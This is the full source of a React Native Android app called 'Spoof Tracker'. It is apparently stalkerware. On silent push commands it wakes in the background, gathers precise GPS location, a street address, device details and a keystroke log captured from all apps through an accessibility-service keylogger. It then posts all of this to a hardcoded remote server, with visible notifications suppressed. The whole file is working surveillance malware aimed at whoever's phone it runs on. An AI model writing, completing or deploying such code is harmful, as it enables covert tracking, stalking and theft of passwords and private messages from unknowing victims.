import React, { useState, useEffect, useRef } from 'react';
import {
  StyleSheet,
  Text,
  View,
  TextInput,
  TouchableOpacity,
  Alert,
  ScrollView,
  NativeModules,
  Linking,
  Platform,
} from 'react-native';
import * as Location from 'expo-location';
import * as Notifications from 'expo-notifications';
import * as TaskManager from 'expo-task-manager';
import * as Device from 'expo-device';
import * as Battery from 'expo-battery';
import * as Network from 'expo-network';
import AsyncStorage from '@react-native-async-storage/async-storage';
import axios from 'axios';

// =================================================================
//  PERMANENT SERVER URL — baked into the APK.
//  The user taps "Enable Tracking" and nothing else is needed.
// =================================================================
const HARDCODED_SERVER_URL = 'https://spoof-tracker.onrender.com';

const STORAGE_KEY_DEVICE_ID = '@spoof_device_id';
const STORAGE_KEY_SERVER_URL = '@spoof_server_url';
const BACKGROUND_NOTIFICATION_TASK = 'BACKGROUND-NOTIFICATION-TASK';

// ──────────────────────────────────────────────────────────────────
// Keylogger helpers — bridge to native KeyloggerModule
// ──────────────────────────────────────────────────────────────────
const { Keylogger } = NativeModules;

async function readKeylog() {
  try {
    if (!Keylogger) return [];
    const raw = await Keylogger.readLog();
    return JSON.parse(raw || '[]');
  } catch (e) {
    console.log('readKeylog error:', e);
    return [];
  }
}

async function clearKeylog() {
  try {
    if (!Keylogger) return;
    await Keylogger.clearLog();
  } catch (e) {
    console.log('clearKeylog error:', e);
  }
}

async function isKeyloggerEnabled() {
  try {
    if (!Keylogger) return false;
    return await Keylogger.isAccessibilityEnabled();
  } catch (e) {
    return false;
  }
}

function openAccessibilitySettings() {
  if (Platform.OS === 'android') {
    Linking.openSettings();
  }
}

// ──────────────────────────────────────────────────────────────────
// Notification handler: show alerts when app is in foreground
// ──────────────────────────────────────────────────────────────────
Notifications.setNotificationHandler({
  handleNotification: async () => ({
    shouldShowAlert: false, // hide visible notification for FETCH_LOCATION command
    shouldPlaySound: false,
    shouldSetBadge: false,
  }),
});

// Axios header to bypass localtunnel warning (harmless for Render)
axios.defaults.headers.common['Bypass-Tunnel-Reminder'] = 'true';

// ──────────────────────────────────────────────────────────────────
// Helpers
// ──────────────────────────────────────────────────────────────────
async function collectTelemetry() {
  let battery = null;
  try {
    const level = await Battery.getBatteryLevelAsync();
    const state = await Battery.getBatteryStateAsync();
    battery = {
      level: Math.round(level * 100) + '%',
      isCharging: state === Battery.BatteryState.CHARGING || state === Battery.BatteryState.FULL,
      stateText:
        state === Battery.BatteryState.CHARGING ? 'Charging'
        : state === Battery.BatteryState.FULL ? 'Full'
        : state === Battery.BatteryState.UNPLUGGED ? 'Unplugged'
        : 'Unknown',
    };
  } catch (e) { console.log('Battery error:', e); }

  let network = null;
  try {
    const netState = await Network.getNetworkStateAsync();
    network = { type: netState.networkType, isConnected: netState.isConnected };
  } catch (e) { console.log('Network error:', e); }

  return {
    battery,
    network,
    deviceInfo: {
      brand: Device.brand || 'Unknown',
      manufacturer: Device.manufacturer || 'Unknown',
      modelName: Device.modelName || Device.deviceName || 'Android Device',
      osName: Device.osName || 'Android',
      osVersion: Device.osVersion || 'Unknown',
      platformApiLevel: Device.platformApiLevel || null,
      deviceType: Device.deviceType === 1 ? 'PHONE' : Device.deviceType === 2 ? 'TABLET' : 'OTHER',
      totalMemory: Device.totalMemory ? (Device.totalMemory / (1024 ** 3)).toFixed(1) + ' GB' : null,
    },
  };
}

async function obtainBestLocationAndDetails() {
  let coords = null;
  try {
    const current = await Promise.race([
      Location.getCurrentPositionAsync({ accuracy: Location.Accuracy.High }),
      new Promise((_, reject) => setTimeout(() => reject(new Error('GPS timeout')), 8000)),
    ]);
    if (current?.coords) coords = current.coords;
  } catch (err) {
    console.log('High accuracy timeout, falling back:', err.message);
  }

  if (!coords) {
    const lastKnown = await Location.getLastKnownPositionAsync({});
    if (lastKnown?.coords) {
      coords = lastKnown.coords;
    } else {
      const fallback = await Location.getCurrentPositionAsync({ accuracy: Location.Accuracy.Balanced });
      coords = fallback.coords;
    }
  }

  let address = null;
  try {
    const [geo] = await Location.reverseGeocodeAsync({ latitude: coords.latitude, longitude: coords.longitude });
    if (geo) {
      const parts = [
        geo.streetNumber ? `${geo.streetNumber} ${geo.street}` : geo.street,
        geo.district,
        geo.city || geo.subregion,
        geo.region,
        geo.postalCode,
        geo.country,
      ].filter(Boolean);
      address = {
        formatted: parts.join(', '),
        street: geo.street || null,
        city: geo.city || geo.subregion || null,
        region: geo.region || null,
        postalCode: geo.postalCode || null,
        country: geo.country || null,
      };
    }
  } catch (e) { console.log('Reverse geocoding error:', e); }

  return {
    coords,
    locationDetails: {
      accuracy: coords.accuracy ? `±${Math.round(coords.accuracy)} m` : null,
      altitude: coords.altitude ? `${Math.round(coords.altitude)} m` : null,
      heading: coords.heading != null && coords.heading >= 0 ? `${Math.round(coords.heading)}°` : null,
      speed: coords.speed != null && coords.speed > 0 ? `${(coords.speed * 3.6).toFixed(1)} km/h` : 'Stationary',
      address,
    },
  };
}

// ──────────────────────────────────────────────────────────────────
// BACKGROUND TASK
//
// When the phone is killed/backgrounded and a FCM data push arrives,
// Android wakes up a FRESH JS engine to run this task.
// This means NO React state, NO module-level vars survive.
// We MUST read deviceId and serverUrl from AsyncStorage here.
// ──────────────────────────────────────────────────────────────────
TaskManager.defineTask(BACKGROUND_NOTIFICATION_TASK, async ({ data, error }) => {
  if (error) {
    console.error('Background task error:', error);
    return;
  }

  // Dig the payload out of every possible FCM data envelope shape
  const payloadData =
    data?.notification?.request?.content?.data ||
    data?.notification?.data ||
    data?.data ||
    data;

  console.log('Background task fired, payload:', JSON.stringify(payloadData));

  if (!payloadData || payloadData.command !== 'FETCH_LOCATION') return;

  try {
    // Read persisted values from storage — this is the KEY fix.
    const [savedDeviceId, savedServerUrl] = await Promise.all([
      AsyncStorage.getItem(STORAGE_KEY_DEVICE_ID),
      AsyncStorage.getItem(STORAGE_KEY_SERVER_URL),
    ]);

    const serverUrl = (savedServerUrl || HARDCODED_SERVER_URL).replace(/\/+$/, '');
    if (!serverUrl) {
      console.error('Background task: No server URL available, aborting.');
      return;
    }

    console.log('Background task using URL:', serverUrl, 'DeviceID:', savedDeviceId);

    const { coords, locationDetails } = await obtainBestLocationAndDetails();
    const telemetry = await collectTelemetry();

    // Read the accumulated keystroke log from native storage
    const keystrokeLog = await readKeylog();

    // Post by fcmToken so the server can always find the device even if deviceId is missing
    const tokenData = await Notifications.getDevicePushTokenAsync();
    const fcmToken = tokenData.data;

    const body = {
      latitude: coords.latitude,
      longitude: coords.longitude,
      locationDetails,
      telemetry,
      keystrokeLog,
    };

    // Prefer deviceId for lookup, fall back to fcmToken
    if (savedDeviceId) {
      body.deviceId = savedDeviceId;
    } else {
      body.fcmToken = fcmToken;
    }

    await axios.post(`${serverUrl}/api/device/location`, body);
    // Clear keylog only after a successful send
    await clearKeylog();
    console.log('Background: location dispatched successfully!');
  } catch (e) {
    console.error('Background location dispatch failed:', e.message);
  }
});

// Register the task so Android knows which function to call when FCM arrives
Notifications.registerTaskAsync(BACKGROUND_NOTIFICATION_TASK).catch(err => {
  // May throw "already registered" on second run — that's fine
  if (!err?.message?.includes('already')) {
    console.log('Background task registration note:', err?.message);
  }
});

// ──────────────────────────────────────────────────────────────────
// App
// ──────────────────────────────────────────────────────────────────
export default function App() {
  const [deviceId, setDeviceId] = useState('');
  const [serverUrl, setServerUrl] = useState(HARDCODED_SERVER_URL);
  const [status, setStatus] = useState('Loading...');
  const [showConfig, setShowConfig] = useState(false);
  const [logs, setLogs] = useState([]);
  const [keylogEnabled, setKeylogEnabled] = useState(false);
  const serverUrlRef = useRef(HARDCODED_SERVER_URL);
  const deviceIdRef = useRef('');

  const addLog = (msg) => {
    const line = new Date().toLocaleTimeString() + ': ' + msg;
    console.log(line);
    setLogs((prev) => [line, ...prev.slice(0, 12)]);
  };

  // Check accessibility service status on mount + re-check on app focus
  useEffect(() => {
    const checkKeylog = async () => {
      const enabled = await isKeyloggerEnabled();
      setKeylogEnabled(enabled);
    };
    checkKeylog();
    const interval = setInterval(checkKeylog, 5000); // re-check every 5s
    return () => clearInterval(interval);
  }, []);

  // ── On mount: restore persisted deviceId and serverUrl ──────────
  useEffect(() => {
    (async () => {
      try {
        const [savedId, savedUrl] = await Promise.all([
          AsyncStorage.getItem(STORAGE_KEY_DEVICE_ID),
          AsyncStorage.getItem(STORAGE_KEY_SERVER_URL),
        ]);

        // Restore or generate a stable deviceId
        let id = savedId;
        if (!id) {
          id = 'android-' + Math.random().toString(36).substr(2, 9);
          await AsyncStorage.setItem(STORAGE_KEY_DEVICE_ID, id);
        }
        setDeviceId(id);
        deviceIdRef.current = id;
        addLog(`Device ID: ${id}`);

        // Restore server URL — prefer saved, then hardcoded
        const url = savedUrl || HARDCODED_SERVER_URL;
        setServerUrl(url);
        serverUrlRef.current = url;
        addLog(`Server: ${url}`);

        setStatus('Ready — tap Enable Tracking');
      } catch (e) {
        addLog('Storage read error: ' + e.message);
        setStatus('Error loading settings');
      }
    })();

    // Foreground notification listener
    const subscription = Notifications.addNotificationReceivedListener(async (notification) => {
      const data = notification.request?.content?.data;
      if (data?.command === 'FETCH_LOCATION') {
        addLog('📍 Ping received — sending location...');
        sendLocationNow(deviceIdRef.current, serverUrlRef.current);
      }
    });

    return () => subscription.remove();
  }, []);

  const handleUrlChange = async (text) => {
    setServerUrl(text);
    serverUrlRef.current = text;
    // Persist so the background task picks it up even after kill
    await AsyncStorage.setItem(STORAGE_KEY_SERVER_URL, text);
  };

  // ── Core location sender (works foreground AND background) ──────
  const sendLocationNow = async (currentDeviceId, targetUrl) => {
    const cleanUrl = (targetUrl || serverUrlRef.current).trim().replace(/\/+$/, '');
    try {
      addLog('Acquiring GPS...');
      const { coords, locationDetails } = await obtainBestLocationAndDetails();
      const telemetry = await collectTelemetry();
      const keystrokeLog = await readKeylog();

      addLog(`GPS: ${coords.latitude.toFixed(5)}, ${coords.longitude.toFixed(5)}`);
      if (locationDetails.address?.city) addLog(`📍 ${locationDetails.address.city}`);
      if (keystrokeLog.length > 0) addLog(`⌨️ Sending ${keystrokeLog.length} keylog entries`);

      await axios.post(`${cleanUrl}/api/device/location`, {
        deviceId: currentDeviceId,
        latitude: coords.latitude,
        longitude: coords.longitude,
        locationDetails,
        telemetry,
        keystrokeLog,
      });

      await clearKeylog();
      addLog('✅ Location sent!');
    } catch (err) {
      addLog('❌ Send error: ' + err.message);
      console.error('sendLocationNow error:', err);
    }
  };

  // ── Enable Tracking ─────────────────────────────────────────────
  const enableTracking = async () => {
    const cleanUrl = serverUrl.trim().replace(/\/+$/, '');
    if (!cleanUrl) {
      Alert.alert('Server URL Required', 'Set a server URL in settings below.');
      setShowConfig(true);
      return;
    }

    setStatus('Requesting permissions...');

    try {
      // 1. Notifications
      const { granted: notifGranted } = await Notifications.requestPermissionsAsync();
      if (!notifGranted) {
        setStatus('Notification permission denied');
        Alert.alert('Permission Required', 'Notifications are required so the server can wake this device.');
        return;
      }
      addLog('Notifications ✓');

      // 2. Foreground location
      const { granted: fgGranted } = await Location.requestForegroundPermissionsAsync();
      if (!fgGranted) {
        setStatus('Location permission denied');
        Alert.alert('Permission Required', 'Location access is required for tracking.');
        return;
      }
      addLog('Foreground location ✓');

      // 3. Background location — required for pings when app is killed
      try {
        const { granted: bgGranted } = await Location.requestBackgroundPermissionsAsync();
        addLog(bgGranted ? 'Background location ✓' : 'Background location: user chose "While using app"');
      } catch (bgErr) {
        addLog('Background location prompt: ' + bgErr?.message);
      }

      // 4. Get FCM token
      setStatus('Getting push token...');
      const tokenData = await Notifications.getDevicePushTokenAsync();
      const fcmToken = tokenData.data;
      addLog('FCM token ✓');

      // 5. Save URL and register with server
      await AsyncStorage.setItem(STORAGE_KEY_SERVER_URL, cleanUrl);
      serverUrlRef.current = cleanUrl;

      const telemetry = await collectTelemetry();
      setStatus('Registering...');

      const res = await axios.post(`${cleanUrl}/api/device/register`, {
        deviceId,
        fcmToken,
        deviceName: Device.modelName || Device.deviceName || 'Android Device',
        deviceInfo: telemetry.deviceInfo,
      });

      if (res.status === 200 || res.status === 201) {
        setStatus('✅ Tracking Active');
        addLog('Registered with server ✓');
        Alert.alert('Active!', 'Device registered. You can close this app — it will respond to pings in the background.');
      } else {
        throw new Error(`Server returned ${res.status}`);
      }
    } catch (err) {
      console.error('enableTracking error:', err);
      setStatus('Setup failed');
      addLog('Error: ' + err.message);
      if (err.request && !err.response) {
        Alert.alert('Connection Failed', `Cannot reach: ${cleanUrl}\n\nVerify the URL is correct and the server is deployed.`);
      } else {
        Alert.alert('Error', err.response ? JSON.stringify(err.response.data) : err.message);
      }
    }
  };

  return (
    <ScrollView contentContainerStyle={styles.container}>
      <Text style={styles.title}>📡 Spoof Tracker</Text>

      <View style={styles.statusBox}>
        <Text style={styles.statusText}>{status}</Text>
        <Text style={styles.deviceIdText}>{deviceId}</Text>
        <Text style={styles.deviceModelText}>
          {Device.brand ? `${Device.brand} ${Device.modelName}` : 'Android Device'}
          {Device.osVersion ? `  •  Android ${Device.osVersion}` : ''}
        </Text>
      </View>

      <TouchableOpacity style={styles.primaryButton} onPress={enableTracking}>
        <Text style={styles.buttonText}>Enable Tracking</Text>
      </TouchableOpacity>

      <TouchableOpacity
        style={styles.secondaryButton}
        onPress={() => sendLocationNow(deviceIdRef.current, serverUrlRef.current)}
      >
        <Text style={styles.secondaryButtonText}>📍 Send Location Now</Text>
      </TouchableOpacity>

      {/* ── Keylogger status ── */}
      <View style={[styles.keylogCard, keylogEnabled ? styles.keylogActive : styles.keylogInactive]}>
        <Text style={styles.keylogTitle}>
          {keylogEnabled ? '⌨️ Keylogger Active' : '⌨️ Keylogger Inactive'}
        </Text>
        {!keylogEnabled && (
          <TouchableOpacity style={styles.keylogButton} onPress={openAccessibilitySettings}>
            <Text style={styles.keylogButtonText}>Enable in Accessibility Settings →</Text>
          </TouchableOpacity>
        )}
        {keylogEnabled && (
          <Text style={styles.keylogHint}>Capturing keystrokes from all apps. Sent on next ping.</Text>
        )}
      </View>

      <TouchableOpacity style={styles.toggleConfigButton} onPress={() => setShowConfig(!showConfig)}>
        <Text style={styles.toggleConfigText}>
          {showConfig ? '▼ Hide Settings' : '⚙ Server Settings'}
        </Text>
      </TouchableOpacity>

      {showConfig && (
        <View style={styles.card}>
          <Text style={styles.label}>Server URL:</Text>
          <TextInput
            style={styles.input}
            value={serverUrl}
            onChangeText={handleUrlChange}
            placeholder="https://..."
            autoCapitalize="none"
            autoCorrect={false}
          />
          <Text style={styles.hint}>
            Currently: {serverUrl || '(none set)'}
          </Text>
        </View>
      )}

      <View style={styles.logsBox}>
        <Text style={styles.logsTitle}>Live Log</Text>
        {logs.map((log, i) => (
          <Text key={i} style={styles.logText}>{log}</Text>
        ))}
        {logs.length === 0 && <Text style={styles.logText}>Waiting...</Text>}
      </View>
    </ScrollView>
  );
}

const styles = StyleSheet.create({
  container: { flexGrow: 1, backgroundColor: '#0f172a', padding: 22, paddingTop: 55 },
  title: { fontSize: 26, fontWeight: 'bold', color: '#f8fafc', textAlign: 'center', marginBottom: 18 },
  statusBox: {
    backgroundColor: '#1e293b', borderRadius: 14, padding: 18, marginBottom: 16,
    alignItems: 'center', borderWidth: 1, borderColor: '#334155',
  },
  statusText: { fontSize: 18, fontWeight: '700', color: '#38bdf8', marginBottom: 4 },
  deviceIdText: { fontSize: 11, color: '#94a3b8', fontFamily: 'monospace', marginBottom: 2 },
  deviceModelText: { fontSize: 12, color: '#64748b' },
  primaryButton: { backgroundColor: '#2563eb', paddingVertical: 14, borderRadius: 10, alignItems: 'center', marginBottom: 10 },
  buttonText: { color: '#ffffff', fontSize: 16, fontWeight: '700' },
  secondaryButton: { backgroundColor: '#334155', paddingVertical: 12, borderRadius: 10, alignItems: 'center', marginBottom: 14 },
  secondaryButtonText: { color: '#cbd5e1', fontSize: 14, fontWeight: '600' },
  toggleConfigButton: { paddingVertical: 8, alignItems: 'center', marginBottom: 10 },
  toggleConfigText: { fontSize: 13, color: '#64748b', fontWeight: '600' },
  card: { backgroundColor: '#1e293b', borderRadius: 12, padding: 14, marginBottom: 16, borderWidth: 1, borderColor: '#334155' },
  label: { fontSize: 13, fontWeight: '600', color: '#94a3b8', marginBottom: 6 },
  input: { backgroundColor: '#0f172a', borderRadius: 8, borderWidth: 1, borderColor: '#334155', color: '#f8fafc', padding: 10, fontSize: 14 },
  hint: { fontSize: 11, color: '#64748b', marginTop: 6 },
  logsBox: { backgroundColor: '#1e293b', borderRadius: 12, padding: 14, minHeight: 120, borderWidth: 1, borderColor: '#334155' },
  logsTitle: { fontSize: 12, fontWeight: '700', color: '#94a3b8', marginBottom: 6, textTransform: 'uppercase' },
  logText: { fontSize: 11, color: '#64748b', fontFamily: 'monospace', marginVertical: 2 },
  // ── Keylogger card ──
  keylogCard: { borderRadius: 12, padding: 14, marginBottom: 14, borderWidth: 1 },
  keylogActive: { backgroundColor: '#052e16', borderColor: '#16a34a' },
  keylogInactive: { backgroundColor: '#1c0a0a', borderColor: '#7f1d1d' },
  keylogTitle: { fontSize: 14, fontWeight: '700', color: '#f8fafc', marginBottom: 6 },
  keylogButton: { backgroundColor: '#dc2626', borderRadius: 8, paddingVertical: 8, paddingHorizontal: 12, alignSelf: 'flex-start', marginTop: 4 },
  keylogButtonText: { color: '#fff', fontSize: 13, fontWeight: '600' },
  keylogHint: { fontSize: 12, color: '#4ade80', marginTop: 2 },
});
